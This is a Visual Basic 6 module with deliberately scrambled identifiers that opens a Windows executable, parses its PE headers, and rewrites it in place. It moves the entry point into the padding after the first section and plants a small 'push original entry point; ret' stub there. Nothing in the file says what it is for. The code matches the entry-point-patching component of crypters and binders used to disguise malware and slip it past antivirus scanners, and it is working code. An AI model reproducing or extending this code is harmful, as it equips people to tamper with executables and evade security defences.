Attribute VB_Name = "Module3"
Option Explicit
Private Const SIscJ98Fj           As Long = &H5A4D&
Private Const u1rVLHVf            As Long = &H4550&
Private Const rELUIkuvtz1 As Long = &H10B&
Private Const ToGxeS               As Long = &H40
Private Const IjQ0fMaLez               As Long = &HF8
Private Const GHCQasBDOg           As Long = &H28
Private Type BR4b7kFG57
e_magic                     As Integer
e_cblp                      As Integer
e_cp                        As Integer
e_crlc                      As Integer
e_cparhdr                   As Integer
e_minalloc                  As Integer
e_maxalloc                  As Integer
e_ss                        As Integer
e_sp                        As Integer
e_csum                      As Integer
e_ip                        As Integer
e_cs                        As Integer
e_lfarlc                    As Integer
e_ovno                      As Integer
e_res(0 To 3)               As Integer
e_oemid                     As Integer
e_oeminfo                   As Integer
e_res2(0 To 9)              As Integer
e_lfanew                    As Long
End Type
Private Type f8JEEC
Machine                     As Integer
NumberOfSections            As Integer
TimeDateStamp               As Long
PointerToSymbolTable        As Long
NumberOfSymbols             As Long
SizeOfOptionalHeader        As Integer
characteristics             As Integer
End Type
Private Type xqgKiT
VirtualAddress              As Long
Size                        As Long
End Type
Private Type gZKt0qF
Magic                       As Integer
MajorLinkerVersion          As Byte
MinorLinkerVersion          As Byte
SizeOfCode                  As Long
SizeOfInitializedData       As Long
SizeOfUnitializedData       As Long
AddressOfEntryPoint         As Long
BaseOfCode                  As Long
BaseOfData                  As Long
ImageBase                   As Long
SectionAlignment            As Long
FileAlignment               As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion           As Integer
MinorImageVersion           As Integer
MajorSubsystemVersion       As Integer
MinorSubsystemVersion       As Integer
W32VersionValue             As Long
SizeOfImage                 As Long
SizeOfHeaders               As Long
CheckSum                    As Long
SubSystem                   As Integer
DllCharacteristics          As Integer
SizeOfStackReserve          As Long
SizeOfStackCommit           As Long
SizeOfHeapReserve           As Long
SizeOfHeapCommit            As Long
LoaderFlags                 As Long
NumberOfRvaAndSizes         As Long
DataDirectory(0 To 15)      As xqgKiT
End Type
Private Type JIF6wZ62g
Signature                   As Long
FileHeader                  As f8JEEC
OptionalHeader              As gZKt0qF
End Type
Private Type chF2V
SecName                     As String * 8
VirtualSize                 As Long
VirtualAddress              As Long
SizeOfRawData               As Long
PointerToRawData            As Long
PointerToRelocations        As Long
PointerToLinenumbers        As Long
NumberOfRelocations         As Integer
NumberOfLinenumbers         As Integer
characteristics             As Long
End Type
Private Declare Sub OWbbuyBsVd5 Lib "kernel32" Alias "RtlMoveMemory" (wCDBHp As Any, rMlVT As Any, ByVal L As Long)
Public Function oYYvFUrPqTes(ByVal OguOPfhs As String) As Boolean
Dim yDyywCkclVr() As Byte
On Error GoTo oYYvFUrPqTes_Error
Open OguOPfhs For Binary Access Read As #1
ReDim yDyywCkclVr(LOF(1) - 1)
Get #1, , yDyywCkclVr()
Close
If JcZnc1hu99(yDyywCkclVr) Then
Open OguOPfhs For Binary Access Write As #1
Put #1, , yDyywCkclVr()
Close
End If
oYYvFUrPqTes = True
On Error GoTo 0
Exit Function
oYYvFUrPqTes_Error:
End Function
Public Function JcZnc1hu99(ByRef yDyywCkclVr() As Byte) As Boolean
Dim YGbXUN95wWq                    As Long
Dim e1ATfD0T                As Long
Dim zETSbgj9DVM       As BR4b7kFG57
Dim lRCmSjhPtOx       As JIF6wZ62g
Dim s4VQ4oG6R2   As chF2V
OWbbuyBsVd5 zETSbgj9DVM, yDyywCkclVr(0), ToGxeS
If Not zETSbgj9DVM.e_magic = SIscJ98Fj Then
Exit Function
End If
OWbbuyBsVd5 lRCmSjhPtOx, yDyywCkclVr(zETSbgj9DVM.e_lfanew), IjQ0fMaLez
If Not lRCmSjhPtOx.Signature = u1rVLHVf Then
Exit Function
End If
If Not lRCmSjhPtOx.OptionalHeader.Magic = rELUIkuvtz1 Then
Exit Function
End If
OWbbuyBsVd5 s4VQ4oG6R2, yDyywCkclVr(zETSbgj9DVM.e_lfanew + IjQ0fMaLez), GHCQasBDOg
YGbXUN95wWq = lRCmSjhPtOx.OptionalHeader.AddressOfEntryPoint + lRCmSjhPtOx.OptionalHeader.ImageBase
e1ATfD0T = s4VQ4oG6R2.VirtualSize + s4VQ4oG6R2.PointerToRawData
lRCmSjhPtOx.OptionalHeader.AddressOfEntryPoint = e1ATfD0T + lRCmSjhPtOx.OptionalHeader.BaseOfCode - s4VQ4oG6R2.PointerToRawData
OWbbuyBsVd5 yDyywCkclVr(zETSbgj9DVM.e_lfanew), lRCmSjhPtOx, IjQ0fMaLez
s4VQ4oG6R2.VirtualSize = s4VQ4oG6R2.SizeOfRawData
OWbbuyBsVd5 yDyywCkclVr(zETSbgj9DVM.e_lfanew + IjQ0fMaLez), s4VQ4oG6R2, GHCQasBDOg
yDyywCkclVr(e1ATfD0T) = &H68 'Push
OWbbuyBsVd5 yDyywCkclVr(e1ATfD0T + 1), YGbXUN95wWq, &H4 'OEP
yDyywCkclVr(e1ATfD0T + 5) = &HC3 'Ret
JcZnc1hu99 = True
End Function

